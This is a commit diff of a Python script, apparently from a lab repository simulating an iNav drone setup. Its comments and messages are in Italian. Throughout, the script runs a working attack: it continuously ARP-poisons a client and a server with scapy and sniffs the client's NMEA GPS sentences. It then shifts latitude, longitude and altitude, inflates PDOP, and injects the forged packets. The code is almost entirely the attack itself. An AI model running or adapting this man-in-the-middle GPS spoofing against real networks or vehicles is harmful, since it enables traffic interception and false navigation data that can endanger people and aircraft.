0138010690b61ae684fffdb8d56c0fae90589d9b
Alberto Urraro <81329291+cyberTechA@users.noreply.github.com>
2023-10-15 16:22:44 +0200

    Update

--- docker-compose-inav/attack_final.py
+++ docker-compose-inav/attack_final.py
@@ -1,13 +1,23 @@
+
+
+
+
 import scapy.all as scapy
 from scapy.layers.inet import IP, TCP
 from scapy.layers.l2 import ARP
-import time
-import uuid
 import socket
+import re
+from scapy.all import Ether, ARP, srp, send
+import argparse
+import time
+import os
+import sys
+import threading
 
-def get_mac_address():
-    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
-    return mac
+def get_mac(ip):
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
 
 def get_local_ip_address():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -21,101 +31,139 @@ def get_local_ip_address():
         s.close()
     return ip_address
 
-def arp_poison(client_ip, target_ip, target_port):
-    source_mac = get_mac_address()
-    source_ip = get_local_ip_address()
-    print(f"Il tuo indirizzo MAC: {source_mac}")
-    print(f"Il tuo indirizzo IP: {source_ip}")
 
-    arp_response_client = ARP(op=2, pdst=client_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip, hwsrc=source_mac)
-    arp_response_target = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=client_ip, hwsrc=source_mac)
 
-    scapy.send(arp_response_client, verbose=False)
-    scapy.send(arp_response_target, verbose=False)
-    print("ARP poisoning completato.")
-    
-    
-    time.sleep(2)
+def spoof(target_ip, host_ip, verbose=True):
+    target_mac = get_mac(target_ip)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+    send(arp_response, verbose=0)
+    if verbose:
+        self_mac = ARP().hwsrc
+        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, self_mac))
 
-def modify_coordinates(nmea_data):
-    modified_data = []
 
-    for line in nmea_data:
-        if line.startswith("GPGGA"):
-            parts = line.split(",")
-            latitude = float(parts[2][:2]) + float(parts[2][2:]) / 60
-            print(f"Latitudine originale (GPGGA): {latitude:.3f}")
-            latitude += 10
-            parts[2] = f"{latitude:.3f}"
-            print(f"Latitudine modificata (GPGGA): {latitude:.3f}")
-            modified_data.append(",".join(parts))
-        elif line.startswith("GPGSA"):
-            parts = line.split(",")
-            hdop = float(parts[15])
-            print(f"HDOP originale (GPGSA): {hdop:.1f}")
-            hdop += 10
-            parts[15] = f"{hdop:.1f}"
-            print(f"HDOP modificato (GPGSA): {hdop:.1f}")
-            modified_data.append(",".join(parts))
-        elif line.startswith("GPRMC"):
-            parts = line.split(",")
-            latitude = float(parts[3][:2]) + float(parts[3][2:]) / 60
-            print(f"Latitudine originale (GPRMC): {latitude:.3f}")
-            latitude += 10
-            parts[3] = f"{latitude:.3f}"
-            print(f"Latitudine modificata (GPRMC): {latitude:.3f}")
-            modified_data.append(",".join(parts))
+def modify_coordinates(dati_nmea):
+    dati_modificati = []
+
+    for riga in dati_nmea:
+        if riga.startswith("$GPGGA"):
+            parti = riga.split(",")
+            latitudine = float(parti[2][:2]) + float(parti[2][2:]) / 60
+            longitudine = float(parti[4][:3]) + float(parti[4][3:]) / 60
+            altitudine = float(parti[9])
+
+            print(f"Latitudine Originale (GPGGA): {latitudine:.6f}")
+            print(f"Longitudine Originale (GPGGA): {longitudine:.6f}")
+            print(f"Altitudine Originale (GPGGA): {altitudine:.2f}")
+
+            # Modifica la latitudine, longitudine e altitudine (ad esempio, aggiungi 5 gradi a ciascuna)
+            latitudine += 5
+            longitudine += 5
+            altitudine += 50
+
+            parti[2] = f"{latitudine:.6f}"
+            parti[4] = f"{longitudine:.6f}"
+            parti[9] = f"{altitudine:.2f}"
+
+            print(f"Latitudine Modificata (GPGGA): {latitudine:.6f}")
+            print(f"Longitudine Modificata (GPGGA): {longitudine:.6f}")
+            print(f"Altitudine Modificata (GPGGA): {altitudine:.2f}")
+
+            dati_modificati.append(",".join(parti))
+        elif riga.startswith("$GPGSA"):
+            parti = riga.split(",")
+            # Esegui le modifiche necessarie per la frase $GPGSA
+            # Ad esempio, modifica il PDOP (Position Dilution of Precision) all'indice 15
+            pdop = float(parti[15])
+            print(f"PDOP Originale (GPGSA): {pdop:.1f}")
+
+            # Modifica il PDOP (ad esempio, aggiungi 20)
+            pdop += 20
+
+            parti[15] = f"{pdop:.1f}"
+            print(f"PDOP Modificato (GPGSA): {pdop:.1f}")
+
+            dati_modificati.append(",".join(parti))
+        elif riga.startswith("$GPRMC"):
+            parti = riga.split(",")
+            latitudine = float(parti[3][:2]) + float(parti[3][2:]) / 60
+            longitudine = float(parti[5][:3]) + float(parti[5][3:]) / 60
+
+            print(f"Latitudine Originale (GPRMC): {latitudine:.6f}")
+            print(f"Longitudine Originale (GPRMC): {longitudine:.6f}")
+
+            # Modifica la latitudine e la longitudine (ad esempio, aggiungi 5 gradi a ciascuna)
+            latitudine += 5
+            longitudine += 5
+
+            parti[3] = f"{latitudine:.6f}"
+            parti[5] = f"{longitudine:.6f}"
+
+            print(f"Latitudine Modificata (GPRMC): {latitudine:.6f}")
+            print(f"Longitudine Modificata (GPRMC): {longitudine:.6f}")
+
+            dati_modificati.append(",".join(parti))
         else:
-            modified_data.append(line)
+            dati_modificati.append(riga)
 
-    return modified_data
+    return dati_modificati
 
-def handle_packet(packet, target_ip, target_port):
-    if IP in packet and TCP in packet and packet[IP].dst == target_ip and packet[TCP].dport == target_port:
-        nmea_data = packet[TCP].payload.load.decode("ascii").split("\r\n")
-        print("Pacchetto ricevuto:")
-        print(nmea_data)
 
-        modified_nmea_data = modify_coordinates(nmea_data)
+def handle_packet(packet, target_ip, target_port, client_port):
+    if IP in packet and TCP in packet and hasattr(packet[TCP], 'load'):
+        if packet[IP].dst == target_ip and packet[TCP].dport == target_port:
+            nmea_data = packet[TCP].load.decode("ascii").split("\r\n")
+            print("Pacchetto ricevuto:")
+            print(nmea_data)
 
-        original_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=5762) / "\r\n".join(nmea_data)
-        modified_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=5762) / "\r\n".join(modified_nmea_data)
+            modified_nmea_data = modify_coordinates(nmea_data)
 
-        print("Pacchetto originale:")
-        original_packet.show()
-        print("Pacchetto modificato:")
-        modified_packet.show()
+            
+            modified_packet = IP(dst=target_ip, src=packet[IP].src) / TCP(dport=target_port, sport=client_port) / "\r\n".join(modified_nmea_data)
 
-        scapy.send(modified_packet, verbose=False)
-        print("Pacchetto modificato ed inviato.")
+            print("Pacchetto Originale:")
+            packet.show()
+            print("Pacchetto Modificato:")
+            modified_packet.show()
 
-def get_arp_table():
-    arp_request = scapy.ARP(pdst="172.18.0.1/16")  # Modifica con la tua subnet
-    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = ether / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+            # Invia il pacchetto modificato
+            send(modified_packet, verbose=False)
+            print("Pacchetto modificato ed inviato.")
+            time.sleep(1)  # Attendi 1 secondo prima di catturare la risposta
 
-    print("Tabella ARP:")
-    for element in answered_list:
-        print(f"IP: {element[1].psrc} - MAC: {element[1].hwsrc}")
+def ripristina(target_ip, host_ip, verbose=True):
+    target_mac = get_mac(target_ip)
+    host_mac = get_mac(host_ip)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
+    send(arp_response, verbose=0, count=7)
+    if verbose:
+        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, host_mac))
+
+def spoofing_loop(client_ip, server_ip, verbose=True):
+    while True:
+        spoof(client_ip, server_ip, verbose)
+        spoof(server_ip, client_ip, verbose)
+        time.sleep(1)
+       
+
+def sniffing_loop(client_ip, client_port, server_ip, server_port):
+    while True:
+        scapy.sniff(filter=f"tcp and (src host {client_ip} and src port {client_port})", prn=lambda x: handle_packet(x, server_ip, server_port, client_port))
 
 def main():
     client_ip = "172.18.0.3"
-    target_ip = "172.18.0.2"
-    target_port = 5762
+    client_port = 3000
+    server_ip = "172.18.0.2"
+    server_port = 5762
+    verbose = True
 
-    print("Tabella ARP prima dell'ARP poisoning:")
-    get_arp_table()
+   
 
-    arp_poison(client_ip, target_ip, target_port)
+    spoofing_thread = threading.Thread(target=spoofing_loop, args=(client_ip, server_ip, verbose))
+    spoofing_thread.start()
 
-    print("Tabella ARP dopo l'ARP poisoning:")
-    get_arp_table()
-
-    
-
-    while True:
-        packets = scapy.sniff(filter=f"tcp and (src host {client_ip} and src port 3000)", prn=lambda x: handle_packet(x, target_ip, target_port))
+    sniffing_thread = threading.Thread(target=sniffing_loop, args=(client_ip, client_port, server_ip, server_port))
+    sniffing_thread.start()
 
 if __name__ == "__main__":
     main()
